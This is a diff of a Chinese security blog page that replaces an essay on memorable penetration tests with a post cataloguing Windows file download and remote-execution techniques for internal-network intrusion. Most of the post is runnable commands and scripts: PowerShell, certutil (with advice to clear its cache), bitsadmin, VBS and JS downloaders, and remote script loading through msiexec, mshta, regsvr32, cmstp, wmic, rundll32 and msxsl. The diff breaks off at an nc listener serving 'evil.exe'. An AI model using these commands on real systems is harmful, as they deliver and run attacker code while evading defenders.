@@ -152,7 +152,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
-    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/08/10/%E5%85%B3%E4%BA%8E%E6%B8%97%E9%80%8F%E7%BB%8F%E5%85%B8%E6%A1%88%E4%BE%8B%E7%9A%84%E6%80%9D%E8%80%83/">
+    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -166,7 +166,7 @@
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
           
-            <a href="/2020/08/10/%E5%85%B3%E4%BA%8E%E6%B8%97%E9%80%8F%E7%BB%8F%E5%85%B8%E6%A1%88%E4%BE%8B%E7%9A%84%E6%80%9D%E8%80%83/" class="post-title-link" itemprop="url">关于渗透经典案例的思考</a>
+            <a href="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">windows文件下载方式总结</a>
         </h1>
 
         <div class="post-meta">
@@ -175,9 +175,26 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2020-08-10 19:07:41 / Modified: 19:09:25" itemprop="dateCreated datePublished" datetime="2020-08-10T19:07:41+08:00">2020-08-10</time>
+              <time title="Created: 2020-08-12 17:21:36" itemprop="dateCreated datePublished" datetime="2020-08-12T17:21:36+08:00">2020-08-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-09-02 20:02:07" itemprop="dateModified" datetime="2020-09-02T20:02:07+08:00">2020-09-02</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="index">
+                    <span itemprop="name">内网渗透</span>
+                  </a>
+                </span>
             </span>
 
           
@@ -191,9 +208,158 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">最近刚好要做一次分享，要用到自己以往的项目经历，但是我经过了仔细呢思索，翻了翻之前的项目笔记，</span><br><span class="line">发现竟然没有非常经典的渗透案例，也是非常的失望，工作这么久竟然连一点拿的出手的项目经历都没有。</span><br></pre></td></tr></table></figure>
+          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">好好学习，天天向上</span><br></pre></td></tr></table></figure>
 
-<p>​       既然要谈谈经典的渗透案例，那先得说说什么样的渗透是经典的。第一点，不常规的思路。如果是通过非常常规的思路，比如注入，后台，上传，这个过程中如果非常的顺利，那这个项目就不是一个经典的案例，因为这个全是新手都知道的东西。第二点，稍微有些复杂的攻击链。<br>即使我们的思路非常不常规，如果在突破了某个点以后就结束了，这样好像也不是非常经典，所以如果是一个非常经典的经历，应该是有点历经波折这种感觉或者说绝处逢生也行。<br>        知道了什么是经典案例，再分析一下为什么我做了那么多项目却没有经典的。项目过于简单？应该是不存在的，因为后来我参与的很多项目都不算是简单的。那是项目太难了吗？是的吧，因为感觉很多项目都让人觉得没有希望，可是项目如果简单的话那也不会有经典的案例，所以项目是需要稍微难一点的，那为什么我做了那么多的难项目，却没有经典呢？我分析了一下，应该是项目的难度发生了变化，我的思路仍然没有变化，还是用之前的思路去渗透，这样的话我就不能攻克这样的系统，连打点都打不下，自然没有经典的案例产生了，这里又会有一个比较矛盾的问题，如果我用常规的思路攻克了，那么这个项目就不会是一个经典的项目，没攻克就更不会是了。所以这里的本质问题就出来了，因为总是使用常规的思路，这里的常规思路当然就是我之前渗透的经验。<br>​        那又有一个问题，我不用我以往的经验用什么，对啊，如果我不用自己以往的经验，我就要去学新东西，这个在项目中学习的成本也是非常高的，这个显然也是不现实的。所以这里又从一方面涉及到了日常技术积累的重要性。<br>​     我们肯定不是在任何项目的一开始就想去使用非常规的思路去做。什么项目适合用非常规的方法去做呢，肯定是我们用了常规思路做了以后没有结果，这个时候如果还固执的使用以往的经验继续做，可能最终比较难攻克，所以到这个时候就是想办法去找其他可能的思路的时候了，比如各种方式的钓鱼，社工，甚至物理渗透或者某种迂回的打法。这当然值得是一个小的点，还有很多其他需要我们去思考创新的一些手法，这个是一点，可以总结为新的思路的创新。<br>​    还有一点的话，我师傅会有一些比较经典的项目，结合他这个人的特点，他这个人渗透比较喜欢死磕，这个我也和他聊过，他认为有希望攻克的点就会死磕，所以第二个点的话就是找到自己认为有希望的点，然后想尽办法去死磕。<br>​    要使用这种方式，当然也是有前提的，第一点就是能找到一个认为有希望的点，他可能是一个挖掘出来但是非常难以利用的漏洞，或者说是需要某些组合利用才可以的才可以达到我们目的的点。有希望的说法可能不太好去理解，也可以说是有攻击成功的可能性，也就是这个攻击路径虽然复杂，不过我们只要找到了某种方式，最终会找到一个可达的攻击路径。我认为确认一个点是否可以磕，就是先抛开难度这种因素，分析这种攻击路径是否可达，可以实现我们的目的，如果可以，那么这个点就满足了可以磕的一个条件，当然，实际项目中还需要考虑时间成本的问题，从很多可以磕的点挑一个成本最低的一个点磕。<br>​      所以分析了这么多，<strong>希望自己能尽快有一些经典案例吧！</strong></p>
+<p>​        我认为按照我们平时对于远程加载文件的需求，可以按照能否加载任意格式的文件来进行区分，有些下载方式，可以去远程下载任意格式的文件，比如exe,txt等等，但是有些则是有限制的，只能下载指定格式的文件，比如js，xls，msi等等。还有些方式也可以下载或者加载远程的文件，但是不是windows自带的方式，所以也可以把这种方式当作一种类型进行总结。最后还有一些方式不能通过http协议进行下载，但是可以通过smb协议进行下载文件，这也可以列为一种方式。</p>
+<h3 id="下载任意格式文件"><a href="#下载任意格式文件" class="headerlink" title="下载任意格式文件"></a>下载任意格式文件</h3><h4 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h4><p><strong>方法一：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell (new-object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;xxx:6666&#x2F;1.txt&#39;,&#39;C:\Windows\Temp\2.txt&#39;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200812213732096.png" alt="image-20200812213732096"></p>
+<p><strong>方法二：</strong></p>
+<pre><code>首先准备一个ps脚本，内容如下</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$Urls &#x3D; @()</span><br><span class="line">$Urls +&#x3D; &quot;http:&#x2F;&#x2F;xxx:6666&#x2F;foo.xsl&quot;</span><br><span class="line">$OutPath &#x3D; &quot;C:\Windows\Temp\&quot; </span><br><span class="line">ForEach ( $item in $Urls) &#123;</span><br><span class="line">$file &#x3D; $OutPath + ($item).split(&#39;&#x2F;&#39;)[-1]</span><br><span class="line">(New-Object System.Net.WebClient).DownloadFile($item, $file) </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​        使用下面命令执行下载文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass -File down.ps1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200812214929736.png" alt="image-20200812214929736"></p>
+<h4 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h4><p>​        用于备份证书服务，支持xp-win10都支持。由于certutil下载文件都会留下缓存，所以一般都建议下载完文件后对缓存进行删除。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;xxx:6666&#x2F;1.txt c:\windows\temp\test.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200820104905690.png" alt="image-20200820104905690"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;ccc:6666&#x2F;1.txt delete  删除缓存</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200820105120705.png" alt="image-20200820105120705"></p>
+<h4 id="bitsadmin"><a href="#bitsadmin" class="headerlink" title="bitsadmin"></a>bitsadmin</h4><p>​        bitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin &#x2F;transfer n http:&#x2F;&#x2F;xxxx:6666&#x2F;1.txt C:\Windows\Temp\3.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200820105507751.png" alt="image-20200820105507751"></p>
+<h4 id="vbs"><a href="#vbs" class="headerlink" title="vbs"></a>vbs</h4><p><strong>方法一：</strong></p>
+<p>​        可以使用vbs脚本来执行文件下载操作,vbs内容如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set a&#x3D;createobject(&quot;adod&quot;+&quot;b.stream&quot;):set w&#x3D;createobject(&quot;micro&quot;+&quot;soft.xmlhttp&quot;):w.open&quot;get&quot;,wsh.arguments(0),0:w.send:a.type&#x3D;1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2</span><br></pre></td></tr></table></figure>
+
+<p>​        再使用cscript加载该文件执行下载写入的功能</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript &#x2F;nologo downfile.vbs http:&#x2F;&#x2F;xxx:801&#x2F;1.txt c:\windows\temp\1.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821100115562.png" alt="image-20200821100115562"></p>
+<p>​        甚至也可以使用cmd先写入vbs文件，最后再调用vbs执行下载功能</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo set a&#x3D;createobject(^&quot;adod^&quot;+^&quot;b.stream^&quot;):set w&#x3D;createobject(^&quot;micro^&quot;+^&quot;soft.xmlhttp^&quot;):w.open^&quot;get^&quot;,wsh.arguments(0),0:w.send:a.type&#x3D;1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 &gt;&gt;downfile.vbs</span><br></pre></td></tr></table></figure>
+
+<p><strong>方法二：</strong></p>
+<p>​        还可以使用其他的下载vbs脚本文件执行下载功能，文件内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">strFileURL &#x3D; &quot;http:&#x2F;&#x2F;119.xxx.xxx.xxx&#x2F;1.txt&quot;</span><br><span class="line">strHDLocation &#x3D; &quot;1.txt&quot;</span><br><span class="line">Set objXMLHTTP &#x3D; CreateObject(&quot;MSXML2.XMLHTTP&quot;)</span><br><span class="line">objXMLHTTP.open &quot;GET&quot;, strFileURL, false</span><br><span class="line">objXMLHTTP.send()</span><br><span class="line">If objXMLHTTP.Status &#x3D; 200 Then</span><br><span class="line">Set objADOStream &#x3D; CreateObject(&quot;ADODB.Stream&quot;)</span><br><span class="line">objADOStream.Open</span><br><span class="line">objADOStream.Type &#x3D; 1</span><br><span class="line">objADOStream.Write objXMLHTTP.ResponseBody</span><br><span class="line">objADOStream.Position &#x3D; 0</span><br><span class="line">Set objFSO &#x3D; CreateObject(&quot;Scripting.FileSystemObject&quot;)</span><br><span class="line">If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation</span><br><span class="line">Set objFSO &#x3D; Nothing</span><br><span class="line">objADOStream.SaveToFile strHDLocation</span><br><span class="line">objADOStream.Close</span><br><span class="line">Set objADOStream &#x3D; Nothing</span><br><span class="line">End if</span><br><span class="line">Set objXMLHTTP &#x3D; Nothing</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821104803291.png" alt="image-20200821104803291"></p>
+<h4 id="js"><a href="#js" class="headerlink" title="js"></a>js</h4><p><strong>方法一：</strong></p>
+<p>​        首先准备一个js文件，文件内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">var objArgs &#x3D; WScript.Arguments;var sGet&#x3D;new ActiveXObject(&quot;ADODB.Stream&quot;);var xGet &#x3D; false;</span><br><span class="line">try &#123;</span><br><span class="line">xGet &#x3D; new XMLHttpRequest();</span><br><span class="line">&#125; </span><br><span class="line">catch (trymicrosoft) &#123;</span><br><span class="line">try &#123;</span><br><span class="line">    xGet &#x3D; new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);</span><br><span class="line">&#125; </span><br><span class="line">catch (othermicrosoft) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">      xGet &#x3D; new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">    &#125; </span><br><span class="line">catch (failed) &#123;</span><br><span class="line">      xGet &#x3D; false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">xGet.Open (&quot;GET&quot;,objArgs(0).toLowerCase(),0);xGet.Send();sGet.Mode&#x3D;3;sGet.Type&#x3D;1;sGet.Open();sGet.Write (xGet.ResponseBody);sGet.SaveToFile (objArgs(1).toLowerCase(),2);</span><br></pre></td></tr></table></figure>
+
+<p>​        通过cscript调用该文件执行下载操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript &#x2F;nologo down.js http:&#x2F;&#x2F;xxx:801&#x2F;1.txt c:\windows\temp\test123123.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821105402895.png" alt="image-20200821105402895"></p>
+<p><strong>方法二：</strong></p>
+<p>​        准备一个js文件，文件内容如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var WinHttpReq &#x3D; new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);</span><br><span class="line">WinHttpReq.Open(&quot;GET&quot;, WScript.Arguments(0), &#x2F;*async&#x3D;*&#x2F;false);</span><br><span class="line">WinHttpReq.Send();</span><br><span class="line">BinStream &#x3D; new ActiveXObject(&quot;ADODB.Stream&quot;); BinStream.Type &#x3D; 1;</span><br><span class="line">BinStream.Open(); BinStream.Write(WinHttpReq.ResponseBody);</span><br><span class="line">BinStream.SaveToFile(&quot;test12312223123.txt&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>​        执行如下命令进行下载文件操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript &#x2F;nologo down2.js http:&#x2F;&#x2F;xxx:801&#x2F;1.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821110118839.png" alt="image-20200821110118839"></p>
+<p><strong>注意</strong></p>
+<p>​        方法二这种文件下载方式有一些缺点，首先不能指定绝对路径，否则会写入失败，另外，文件名也不能和系统在该目录下已有的文件名冲突，否则也会写入失败。</p>
+<h4 id="certreq"><a href="#certreq" class="headerlink" title="certreq"></a>certreq</h4><p>​        在 Windows Server 2008 R2 上提供了 Microsoft certreq 实用程序，可使用该实用程序生成 CSR 和导入签名证书。下载命令如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CertReq -Post -config http:&#x2F;&#x2F;xxx:801&#x2F;1.txt c:\windows\win.ini c:\windows\temp\output.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821110958332.png" alt="image-20200821110958332"></p>
+<p>​        这个程序虽然可以下载任意形式的文件，但是又有两个限制，第一个限制就是在serever 2008 r2以上的系统。第二个就是长度限制，不能下载超过60k的文件。这种文件下载的方式如果文件存在也会报错，因此使用这种方式下载文件，文件名不能和已有的文件名相同。</p>
+<h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;from urllib import urlretrieve; urlretrieve(&#39;http:&#x2F;&#x2F;xxx:801&#x2F;1.txt&#39;, &#39;C:\\Windows\\Temp\\test8866.txt&#39;)&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821114745482.png" alt="image-20200821114745482"></p>
+<h4 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h4><h3 id="下载指定格式文件"><a href="#下载指定格式文件" class="headerlink" title="下载指定格式文件"></a>下载指定格式文件</h3><h4 id="msiexec"><a href="#msiexec" class="headerlink" title="msiexec"></a>msiexec</h4><p>​        使用msiexec可以下载并执行msi文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec &#x2F;q &#x2F;i http:&#x2F;&#x2F;xxxx:8011&#x2F;test666.msi</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821134222982.png" alt="image-20200821134222982"></p>
+<h4 id="mshta"><a href="#mshta" class="headerlink" title="mshta"></a>mshta</h4><p>​        mshta可以远程加载hta文件并执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta http:&#x2F;&#x2F;xxx.xxx.xxx.xxx:801&#x2F;download&#x2F;file.ext</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821134354798.png" alt="image-20200821134354798"></p>
+<h4 id="regsvr32"><a href="#regsvr32" class="headerlink" title="regsvr32"></a>regsvr32</h4><p>​        使用regsvr32可以远程加载并执行sct文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 &#x2F;u &#x2F;s &#x2F;i:http:&#x2F;&#x2F;xxx:8011&#x2F;test8866.sct scrobj.dll</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821135750174.png" alt="image-20200821135750174"></p>
+<h4 id="CMSTP"><a href="#CMSTP" class="headerlink" title="CMSTP"></a>CMSTP</h4><p>​    使用cmstp加载本地的inf文件，inf中再去加载远程的sct文件。</p>
+<p>inf中的内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[version]</span><br><span class="line">Signature&#x3D;$chicago$</span><br><span class="line">AdvancedINF&#x3D;2.5</span><br><span class="line">[DefaultInstall_SingleUser]</span><br><span class="line">UnRegisterOCXs&#x3D;UnRegisterOCXSection</span><br><span class="line">[UnRegisterOCXSection]</span><br><span class="line">%11%\scrobj.dll,NI,http:&#x2F;&#x2F;10.0.0.2&#x2F;tmp&#x2F;powersct.sct</span><br><span class="line">[Strings]</span><br><span class="line">AppAct &#x3D; &quot;SOFTWARE\Microsoft\Connection Manager&quot;</span><br><span class="line">ServiceName&#x3D;&quot;Pentestlab&quot;</span><br><span class="line">ShortSvcName&#x3D;&quot;Pentestlab&quot;</span><br></pre></td></tr></table></figure>
+
+<p>​        再使用如下命令加载inf文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmstp.exe &#x2F;s xxx.inf</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821140228440.png" alt="image-20200821140228440"></p>
+<p>​        使用这种方式加载并执行远程的文件有个缺陷，就是会在执行的目录下生成一个快捷方式文件还有一个cmp文件。</p>
+<h4 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h4><p>​        使用wmic可以加载并执行远程的xsl文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process get brief &#x2F;format:&quot;http:&#x2F;&#x2F;xxx:8080&#x2F;launcher.xsl&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821140727620.png" alt="image-20200821140727620"></p>
+<h4 id="WCS"><a href="#WCS" class="headerlink" title="WCS"></a>WCS</h4><p>​        首先创建一个js文件，文件内容如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetObject(&quot;script:http:&#x2F;&#x2F;xxxx:8011&#x2F;test.wsc&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>​        使用cscript执行js文件，加载并执行远程的wsc文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">csript  1.js</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821141107404.png" alt="image-20200821141107404"></p>
+<p>​        wsc文件中的内容如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;    </span><br><span class="line">&lt;package&gt;</span><br><span class="line">&lt;component id&#x3D;&quot;testCalc&quot;&gt;    </span><br><span class="line">&lt;script language&#x3D;&quot;JScript&quot;&gt;</span><br><span class="line">&lt;![CDATA[</span><br><span class="line">var r &#x3D; new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;); </span><br><span class="line">]]&gt;</span><br><span class="line">&lt;&#x2F;script&gt;    </span><br><span class="line">&lt;&#x2F;component&gt;</span><br><span class="line">&lt;&#x2F;package&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="rundll32"><a href="#rundll32" class="headerlink" title="rundll32"></a>rundll32</h4><p>​        rundll32本身并不能达到加载并且运行远程文件的目的，不过可以配合其他方式来下载远程文件并执行</p>
+<p>比如可以加载hta文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32 javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;C:&#x2F;Windows&#x2F;System32&#x2F;mshta.exe http:&#x2F;&#x2F;xxx.xxx.xxx.xxx:8011&#x2F;test.hta&quot;,0,true);self.close();</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821141739314.png" alt="image-20200821141739314"></p>
+<h3 id="非自带程序"><a href="#非自带程序" class="headerlink" title="非自带程序"></a>非自带程序</h3><h4 id="msxsl"><a href="#msxsl" class="headerlink" title="msxsl"></a>msxsl</h4><p>​        msxsl.exe可以去加载远程的xsl文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msxsl.exe http:&#x2F;&#x2F;xxx.xxx.xxx.xxx:8011&#x2F;test.xsl  http:&#x2F;&#x2F;xx.xxx.xx.xx:8011&#x2F;test.xsl</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821142928346.png" alt="image-20200821142928346"></p>
+<p>​        xsl文件内容如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&#39;1.0&#39;?&gt;</span><br><span class="line">&lt;stylesheet</span><br><span class="line">xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;XSL&#x2F;Transform&quot; xmlns:ms&#x3D;&quot;urn:schemas-microsoft-com:xslt&quot;</span><br><span class="line">xmlns:user&#x3D;&quot;placeholder&quot;</span><br><span class="line">version&#x3D;&quot;1.0&quot;&gt;</span><br><span class="line">&lt;output method&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">	&lt;ms:script implements-prefix&#x3D;&quot;user&quot; language&#x3D;&quot;JScript&quot;&gt;</span><br><span class="line">	&lt;![CDATA[</span><br><span class="line">	var r &#x3D; new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc&quot;);</span><br><span class="line">	]]&gt; &lt;&#x2F;ms:script&gt;</span><br><span class="line">&lt;&#x2F;stylesheet&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h4><p>​        首先在自己的服务端执行如下命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444 &lt; evil.exe</span><br></pre></td></tr></table></figure>
+
